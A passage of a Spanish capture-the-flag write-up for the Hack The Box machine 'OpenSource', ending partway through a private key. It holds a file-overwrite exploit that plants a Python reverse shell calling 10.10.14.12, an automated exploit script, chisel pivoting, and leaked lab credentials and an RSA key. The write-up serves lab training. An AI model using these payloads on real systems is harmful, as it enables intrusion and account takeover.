---
title: "HTB: Resolución de OpenSource"
date: 2022-10-08 19:00:00 +/-TTTT
categories: [HTB, Linux]
tags: [python,gitea,git hooks, werkzeug, lfi]     ## TAG names should always be lowercase
image: /photos/2022-10-08-OpenSource-WriteUp/htb.jpg
---

**OpenSource** es una máquina ***Linux*** en la que explotaremos una **vulnerabilidad** de la funcionalidad de la librería os de python **path.join()** para sobrescribir un archivo y adentrarnos en un **contenedor**. Desde aquí tendremos acceso a un servicio web que corre en el puerto 3000 de la máquina víctima, ***Gitea***. Nos podremos autenticar con unas credenciales halladas previamente y aquí encontraremos una clave privada **id_rsa** con las cual nos podremos autenticar por **SSH**. Finalmente para escalar a **root**, nos aprovecharemos de un ***script*** que esta corriendo este usuario a intervalos regulares de tiempo para que nos ejecute un comando empleando **git hooks**.  

En la sección extra describo otra vía para podernos adentrar en el contenedor, forjándonos un **pin** para poder utilizar la consola de **Werkzeug**, explotando un *Local File Inclusion* (**LFI**).


##  Información de la máquina 

<table width="100%" cellpadding="2">
    <tr>
        <td>
            <img src="/photos/2022-10-08-OpenSource-WriteUp/OpenSource.png" alt="drawing" width="465"  />  
        </td>
        <td>
            <img src="/photos/2022-10-08-OpenSource-WriteUp/graph.png" alt="drawing" width="400"  />  
        </td>
    </tr>
</table>


##  Reconocimiento  

### ping  


Primero enviaremos un *ping* a la máquina víctima para saber su sistema operativo y si tenemos conexión con ella. Un *TTL* menor o igual a 64 significa que la máquina es *Linux*. Por otra parte, un *TTL* menor o igual a 128 significa que la máquina es *Windows*.

<img src="/photos/2022-10-08-OpenSource-WriteUp/ping.png" alt="drawing"  />  

Vemos que nos enfrentamos a una máquina ***Linux*** ya que su ttl es 63.
 
### nmap  

Ahora procedemos a escanear todo el rango de puertos de la máquina víctima con la finalidad de encontrar aquellos que estén abiertos (*status open*). Lo haremos con la herramienta ```nmap```. 

<img src="/photos/2022-10-08-OpenSource-WriteUp/allports.png" alt="drawing"  />  

**-sS** efectúa un *TCP SYN Scan*, iniciando rápidamente una conexión sin finalizarla.  
**-min-rate 5000** sirve para enviar paquetes no mas lentos que 5000 paquetes por segundo.  
**-n** sirve para evitar resolución DNS.  
**-Pn** para evitar host discovery.  
**-vvv** triple *verbose* para que nos vuelque la información que vaya encontrando el escaneo.  
**-p-** para escanear todo el rango de puertos.  
**--open** para escanear solo aquellos puertos que tengan un *status open*.  
**-oG** exportará la evidencia en formato *grepeable* al fichero **allPorts** en este caso.

Una vez descubiertos los **puertos abiertos**, que en este caso son el **22 y el 80**, lanzaremos una serie de *scripts* básicos de enumeración contra estos, en busca de los servicios que están corriendo y de sus versiones. 

Ejecutaremos: ```nmap -sCV -p22,80 10.10.11.170 -oN targeted```. Obtendremos el siguiente volcado:

```python
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-08 11:24 CEST
Nmap scan report for 10.10.11.164
Host is up (0.39s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp open  http    Werkzeug/2.1.2 Python/3.10.3
|_http-title: upcloud - Upload files for Free!
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Sat, 08 Oct 2022 09:24:40 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5316
|     Connection: close
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>upcloud - Upload files for Free!</title>
|     <script src="/static/vendor/jquery/jquery-3.4.1.min.js"></script>
|     <script src="/static/vendor/popper/popper.min.js"></script>
|     <script src="/static/vendor/bootstrap/js/bootstrap.min.js"></script>
|     <script src="/static/js/ie10-viewport-bug-workaround.js"></script>
|     <link rel="stylesheet" href="/static/vendor/bootstrap/css/bootstrap.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/>
|     <link rel=
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Sat, 08 Oct 2022 09:24:40 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, OPTIONS, GET
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.92%I=7%D=10/8%Time=634141D7%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,1573,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.1\.2\x20P
SF:ython/3\.10\.3\r\nDate:\x20Sat,\x2008\x20Oct\x202022\x2009:24:40\x20GMT
SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
SF:5316\r\nConnection:\x20close\r\n\r\n<html\x20lang=\"en\">\n<head>\n\x20
SF:\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=
SF:\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\
SF:n\x20\x20\x20\x20<title>upcloud\x20-\x20Upload\x20files\x20for\x20Free!
SF:</title>\n\n\x20\x20\x20\x20<script\x20src=\"/static/vendor/jquery/jque
SF:ry-3\.4\.1\.min\.js\"></script>\n\x20\x20\x20\x20<script\x20src=\"/stat
SF:ic/vendor/popper/popper\.min\.js\"></script>\n\n\x20\x20\x20\x20<script
SF:\x20src=\"/static/vendor/bootstrap/js/bootstrap\.min\.js\"></script>\n\
SF:x20\x20\x20\x20<script\x20src=\"/static/js/ie10-viewport-bug-workaround
SF:\.js\"></script>\n\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href
SF:=\"/static/vendor/bootstrap/css/bootstrap\.css\"/>\n\x20\x20\x20\x20<li
SF:nk\x20rel=\"stylesheet\"\x20href=\"\x20/static/vendor/bootstrap/css/boo
SF:tstrap-grid\.css\"/>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20hr
SF:ef=\"\x20/static/vendor/bootstrap/css/bootstrap-reboot\.css\"/>\n\n\x20
SF:\x20\x20\x20<link\x20rel=")%r(HTTPOptions,C7,"HTTP/1\.1\x20200\x20OK\r\
SF:nServer:\x20Werkzeug/2\.1\.2\x20Python/3\.10\.3\r\nDate:\x20Sat,\x2008\
SF:x20Oct\x202022\x2009:24:40\x20GMT\r\nContent-Type:\x20text/html;\x20cha
SF:rset=utf-8\r\nAllow:\x20HEAD,\x20OPTIONS,\x20GET\r\nContent-Length:\x20
SF:0\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTM
SF:L\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x
SF:20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equ
SF:iv=\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x2
SF:0</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>E
SF:rror\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code
SF::\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20req
SF:uest\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20
SF:Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20
SF:\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.56 seconds
```

El puerto **22** es **SSH** y el puerto **80** es **HTTP**. De momento, como no disponemos de credenciales para autenticarnos contra *SSH*, nos centraremos en auditar el servicio web que corre en el puerto 80.

*Nmap* nos descubre que como tecnologías el servidor web esta utilizando ***Werkzeug/2.1.2 Python/3.10.3***. Werkzeug es una biblioteca cuyo objetivo es hacer de comunicador entre el código python y el servidor http.  

También nos descubre que el título de la web es **upcloud - Upload files for Free!**.

### Puerto 80 abierto (HTTP) 

El primer paso será utilizar la herramienta **whatweb** para descubrir las tecnologías que utiliza el servidor web:

<img src="/photos/2022-10-08-OpenSource-WriteUp/whatweb.png" alt="drawing"  />  

Nos vuelca exactamente la misma información que el *script* anterior de *nmap*. 

Cuando accedemos a la **página web** vemos lo siguiente:

<img src="/photos/2022-10-08-OpenSource-WriteUp/indexhtml.png" alt="drawing"  />  

Parece que es una web dedicada a la subida y compartición de archivos.  

Si pinchamos en ***Download*** nos podremos descargar el código fuente del aplicativo mientras que si le damos a ***Take me there!*** nos redirigirá al mismo.

Para acabar con el reconocimiento inicial, la extensión de navegador ***wappalyzer*** nos detecta que como framework web de python se está utilizando ***Flask***:

<img src="/photos/2022-10-08-OpenSource-WriteUp/wappalyzer.png" alt="drawing"  />  

#### Analizando aplicación upcloud 

Por lo tanto, si pinchamos en ***Take me there!***, la web nos llevará a ***http://10.10.11.164/upcloud***. El contenido es el siguiente:

<img src="/photos/2022-10-08-OpenSource-WriteUp/upcloud.png" alt="drawing"  />  

Nos da la posibilidad de subir un archivo. Si por ejemplo subimos un archivo *test.txt* obtendremos una **URL** para poder visualizarlo via web.

<img src="/photos/2022-10-08-OpenSource-WriteUp/test.png" alt="drawing"  />  

Podemos probar ataques como ***directory path traversal*** o ***SSTI*** jugando con el nombre y el contenido del archivo que queremos subir, pero no obtendremos el resultado esperado. Por detrás debe de haber alguna **funcionalidad que sanitiza nuestro input**. Como disponemos del código fuente de la aplicación, podremos ver como lo hace.

Finalmente, también puede estar interesante visualizar el error de la web si le indicamos un archivo que no existe, por ejemplo *http://10.10.11.164/uploads/test.tx*:

<img src="/photos/2022-10-08-OpenSource-WriteUp/filenotexisterror.png" alt="drawing"  />  

Existe un ***information leakage*** que nos está revelando el **path** del sistema donde se encuentra la carpeta *uploads*, en **/app/public/uploads**.

#### Código fuente de upcloud 

##### Analizando logs de git 

Si descomprimimos el archivo **source.zip** obtenemos lo siguiente:

<img src="/photos/2022-10-08-OpenSource-WriteUp/source.png" alt="drawing"  />  

Podemos ver que existe un directorio **.git**. En este directorio es donde se almacenan los metadatos y la base de datos de objetos del aplicativo. Git permite ver los logs y los commits del proyecto, así que vamos a analizarlos. Si ejecutamos el comando **git branch** vemos lo siguiente:

<img src="/photos/2022-10-08-OpenSource-WriteUp/branch.png" alt="drawing"  />  

En este proyecto existen dos ramas: **dev** y **public**, que es en la que nos encontramos ahora (el * nos lo indica). Podemos ver los logs de **public** con el comando **git log**:

<img src="/photos/2022-10-08-OpenSource-WriteUp/logpublic.png" alt="drawing"  />  

Los podemos analizar con el comando **git show \<nombre del commit\>** pero no encontraremos nada interesante.  

En cambio, si nos cambiamos a la rama **dev** con el comando **git checkout dev** y listamos los logs:

<img src="/photos/2022-10-08-OpenSource-WriteUp/logdev.png" alt="drawing"  />  

Y posteriormente visualizamos el contenido del commit a76f8f75f7a4a12b706b0cf9c983796fa1985820 con el comando **git show a76f8f75f7a4a12b706b0cf9c983796fa1985820**:

<img src="/photos/2022-10-08-OpenSource-WriteUp/showcredentials.png" alt="drawing"  />  

Encontraremos las siguientes credenciales: ***dev01:Soulless_Developer#2022***.

##### Analizando el código de la web 

En la capeta **/app** podemos encontrar las subcarpetas **/public/uploads**, ruta que ya habíamos visto anteriormente en el error de la web, donde se se guardaban los archivos subidos, y la subcarpeta **app** que es donde se encuentra el código de la web.

En **views.py** podemos ver el funcionamiento de la web para guardar un archivo y poderlo visualizar:

<img src="/photos/2022-10-08-OpenSource-WriteUp/viewspy.png" alt="drawing"  />  

Para la subida de un archivo, el servicio coge el nombre de nuestro fichero y lo pasa por una función llamada **get_file_name**, definida en **utils.py**. Posteriormente concatena el path actual con *public* y *uploads* con la función **os.path.join()** y finalmente lo guarda en esta ruta. 

El comportamiento de la función **os.path.join()** es un tanto peculiar. Lo que hace es concatenar los argumentos que le pasas para formar un *path*, pero si alguno empieza por **/**, borra los argumentos anteriores y empieza el *path* por ese mismo. Es decir, si miramos este ejemplo:

```python
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> file_name = "test"
>>> print(os.path.join("/app","public","uploads",file_name))
/app/public/uploads/test
>>> file_name = "/test"
>>> print(os.path.join("/app","public","uploads",file_name))
/test
>>> 
```
Vemos que si file_name es igual a ***test***, el *path* resultante sería ***/app/public/uploads/test***, pero si file_name es igual a ***/test*** el *path* quedaría ***/test***.

En **utils.py** podemos ver que la función **get_file_name()** coge nuestro archivo y le quita los **../** de forma recursiva, haciendo imposible aplicar *drectory path traversal*. También podemos ver que pone ***TODO: get unique filename***. Si pone *TODO* es posible que la función *get_unique_upload_name()* no esté implementada en el servidor actual y podamos **sobrescribir archivos**. 

<img src="/photos/2022-10-08-OpenSource-WriteUp/utilspy.png" alt="drawing"  />  

##  Consiguiendo shell como root en un contenedor  

Por lo tanto, sabiendo:
1. Como funciona ***os.path.join()***.
2. Que se puede **sobrescribir archivos**.
3. La ruta absoluta donde se encuentra el código de la aplicación en la máquina víctima (**/app/app/**).
 
Podríamos sobrescribir el archivo **views.py**, creando un nuevo *endpoint*, por ejemplo **http://10.10.11.164/pwned** que nos envíe una **reverse shell** al ejecutarse.

Entonces, **views.py** quedaría de la siguiente manera:

```python
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/download')
def download():
    return send_file(os.path.join(os.getcwd(), "app", "static", "source.zip"))


@app.route('/upcloud', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))

@app.route('/pwned')
def pwned():
    os.system('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'')
```

De esta forma, cuando accedamos a **http://10.10.11.164/pwned**, el sistema nos enviará una **reverse shell** a la ip **10.10.14.12** por el puerto **443**.

Ahora para subir el archivo, deberemos interceptar la petición con **BurpSuite** y cambiar el campo *filename* de **views.py** a **/app/app/views.py**. De esta manera, ***os.path.join()*** debería de guardar el archivo en **/app/app/views.py** y, por consiguiente, sobrescribir el *views.py* antiguo de la víctima. En la siguiente imagen podemos ver el campo **filename** ya cambiado.

<img src="/photos/2022-10-08-OpenSource-WriteUp/burp.png" alt="drawing"  />  

Después de darle a *Forward* ya habremos modificado el archivo en la máquina víctima y ya podremos acceder a **http://10.10.11.164/pwned**. Cuando lo hagamos recibiremos nuestra *reverse shell*.

<img src="/photos/2022-10-08-OpenSource-WriteUp/revShell.png" alt="drawing"  />  

Existe otra forma de ganar acceso al contenedor. La contemplo en el apartado I*Extra*.

### Script Autopwn 

El siguiente *script* permite la **intrusión** de manera **automática** al contenedor. Simplemente se debe de tener en el mismo directorio el views.py malicioso mostrado anteriormente.

```python 
#!/usr/bin/python3 

from pwn import *
import requests,sys,threading

#Ctrl+C 
def def_handler(sig,frame):
    print("[!] Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT,def_handler)

#Variables globales 
url = "http://10.10.11.164/upcloud"
burp = {'http': 'http://localhost:8080'}

def makeRequest():

    content = open("views.py", "rb")
    file_to_upload = {'file':('/app/app/views.py',content,'text/x-python')}

    r = requests.post(url,files = file_to_upload)
    r = requests.get("http://10.10.11.164/pwned")

if __name__ == '__main__':
    p1 = log.progress("OpenSource AutoPwn")
    p1.status("Exploiting python os.path.join uploading malicious file")
    time.sleep(2)

    try:
        threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(443, timeout=20).wait_for_connection()

    if shell.sock is None:
        p1.failure("Connection couldn't be stablished")
        sys.exit(1)
    else:
        shell.interactive()
```

##  Consiguiendo shell como dev01  

Una vez recibida la shell, deberemos hacerle un **tratamiento** para que nos permita poder hacer *Ctrl+C*, borrado de los comandos, movernos con las flechas... Los  comandos que ingresaremos serán:

```python
python -c 'import pty;pty.spawn("/bin/sh")'
*Ctrl+Z*
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

También deberemos **adaptar el número de filas y de columnas** de esta *shell*. Con el comando ```stty size``` podemos consultar nuestras filas y columnas y con el comando ```stty rows <rows> cols <cols>``` podemos ajustar estos campos.

### Reconocimiento del sistema  

Vemos que tenemos asignada la ip **172.17.0.6** y no la **10.10.11.164** de la máquina víctima:

```python
/app ## ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
12: eth0@if13: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:11:00:06 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.6/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

Esto quiere decir que el servicio de **upcloud** está corriendo en un **contenedor** y no en la máquina víctima. Lo que debemos hacer ahora es encontrar una manera de saltar de aquí a la máquina que corre con la ip 10.10.11.164. Si exploramos el contenedor en busca de archivos interesante no encontraremos nada. 

#### Analizando hosts activos del segmento de red 

Lo que podemos hacer es mirar si esta máquina tiene **conexión** con otras del mismo segmento de red, el **172.17.0.0/16**, ya que seguramente una de estas ips sea de la máquina víctima. Para ello me he hecho un *script* **hostDiscovery.sh** que se encargará de enviar un ping a todas las máquinas cuyas ips estén en los rangos **172.17.0.1 y 172.17.0.254**. Es *script* es el siguiente:

```bash
/tmp ## cat hostDiscovery.sh 
if [ $1 ]; then
	network=$1
	for net in $(seq 1 254); do
	timeout 1 sh -c "ping  -c 1 $network.$net >/dev/null 2>/dev/null" && echo "[*] Host activo encontrado: $network.$net"
	done
else
	echo -e "\n[*] USO: ./HostsActivos.sh <@netID>"

fi
```

Dándole permisos de ejecución y ejecutándolo obtenemos lo siguiente:

```
/tmp ## ./hostDiscovery.sh  172.17.0
[*] Host activo encontrado: 172.17.0.1
[*] Host activo encontrado: 172.17.0.2
[*] Host activo encontrado: 172.17.0.3
[*] Host activo encontrado: 172.17.0.4
[*] Host activo encontrado: 172.17.0.5
[*] Host activo encontrado: 172.17.0.6
[*] Host activo encontrado: 172.17.0.7
[*] Host activo encontrado: 172.17.0.8
[*] Host activo encontrado: 172.17.0.9
```

Estas son las ips del segmento de red **172.17.0.0/24** que se encuentran activas. Normalmente, la ip **172.17.0.1** suele ser de una de las interfaces de la máquina víctima (docker asigna por defecto la ip acabada en 1). De hecho, sabiendo que la 10.10.11.164 tenía abierto el puerto 22, podemos comprobar si la 172.17.0.1 también lo tiene con el comando ```nc -zv 172.17.0.1 22```. Efectivamente, si lo tiene.

#### Consiguiendo conexión con la ip 172.17.0.1 

Voy a utilizar la herramienta [chisel](https://github.com/jpillora/chisel), que permite hacer ***port forwarding***, para tener conexión desde mi equipo de atacante a la 172.17.0.1 y poder así analizar los sus puertos abiertos. Recordemos que aunque la ip 172.17.0.1 y 10.10.11.164 pertenezcan a la misma máquina, no tiene por que dar el mismo resultado el escaneo de puertos abiertos. A lo mejor hay implementado algún waf o alguna regla por iptables que no nos permite ver algunos puertos abiertos escaneando la ip 10.10.11.164.

Por lo tanto, en mi máquina me descargaré el chisel de 64 bits y lo ejecutaré de la siguiente manera:

<img src="/photos/2022-10-08-OpenSource-WriteUp/chiselServer.png" alt="drawing"  />  

En la máquina victima, ejecutaremos el chisel de 32 bits de la siguiente forma:

```python
/tmp ## ./chisel32 client 10.10.14.12:1234 R:socks
2022/10/08 10:42:18 client: Connecting to ws://10.10.14.12:1234
2022/10/08 10:42:21 client: Connected (Latency 76.345546ms)
```

Estamos estableciendo un tipo de conexión ***SOCKS***. Esto nos permitirá tener acceso completo a la ip **172.17.0.1** a través del puerto **1080** de nuestro ***localhost***.

Por último nos faltará configurar la herramienta ***proxychains*** para escanear sus puertos pero pasando por el localhost:1080. Su archivo de configuración lo podemos encontrar en la ruta ***/etc/proxychains.conf***. En caso de no tenerlo se tendrá que instalar la herramienta. Deberemos de introducir al final del archivo la siguiente linea: ```socks5 127.0.0.1 1080```.

### Analizando 172.17.0.1  

Ahora ya podremos proceder con un escaneo de *nmap* para descubrir los puertos abiertos de la ip **172.17.0.1**. En mi caso escanearé los 100 mas comunes. El comando que ejecutaremos será:  

```proxychains -q nmap -T5 -n -v --top-ports 100 -sT -oN internalPortDiscovery 172.17.0.1```  

**-q** es el modo silent de *proxychains*.  
**-T5** indica el modo de escaneo, en este caso el mas rápido.  
**-n** sirve para evitar resolución DNS.  
**-v** *verbose* para que nos vuelque la información que vaya encontrando el escaneo.  
**--top-ports 100** para escanear los 100 puertos mas comunes (ya que si los escaneásemos todos el escaneo iría muy lento).  
**-sT** hará un escaneo de conexión TCP completo, en lugar del escaneo predeterminado -sS SYN, que pasando por un proxy no funcionaría.  
**-oN** exportará la evidencia al archivo internalPortDiscovery.  

El resultado es el siguiente:

<img src="/photos/2022-10-08-OpenSource-WriteUp/internalportdiscovery.png" alt="drawing"  />  

El escaneo nos ha descubierto puertos que antes no podíamos ver escaneando la ip 10.10.11.164, concretamente el **puerto 3000**, el 6000 y el 6001. Empezaremos analizando el puerto 3000.

#### Puerto 3000 abierto (HTTP)  

Si enviamos un *curl* a **172.17.0.1:3000** (proxychains -q curl -s http://172.17.0.1:3000  -I) vemos que es una **página web**:

<img src="/photos/2022-10-08-OpenSource-WriteUp/curl.png" alt="drawing"  />  

Vamos a acceder a la **pagina web** con el navegador. Antes de nada deberemos de configurar un proxy, en mi caso ***FoxyProxy***, para que **tunelice** la petición al puerto 1080 de mi localhost, igual que hacía *proxychains*. Por tanto deberemos de crear una nueva entrada con el siguiente contenido:

<img src="/photos/2022-10-08-OpenSource-WriteUp/foxyproxy.png" alt="drawing"  />  

Ahora ya podremos visualizar la página web:

<img src="/photos/2022-10-08-OpenSource-WriteUp/giteaindex.png" alt="drawing"  /> 

Vemos que esta corriendo ***Gitea***, un programa de código abierto semejante a *GitHub*. En la parte superior derecha vemos un apartado de **Sign in** y recordemos que tenemos unas **credenciales** que encontramos al principio y que aun no hemos utilizado: ```dev01:Soulless_Developer#2022```. Si las probamos veremos que son **válidas** y podremos acceder al siguiente repositorio, que se trata de un backup del directorio **home** del usuario **dev01**:

<img src="/photos/2022-10-08-OpenSource-WriteUp/homebackup.png" alt="drawing"  />  

Si nos metemos en el directorio **.ssh**, podremos ver la clave privada **id_rsa** del usuario *dev01* y ya nos podremos conectar como este usuario por **SSH**.

La **clave** es la siguiente:

```
-----BEGIN RSA PRIVATE KEY-----
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
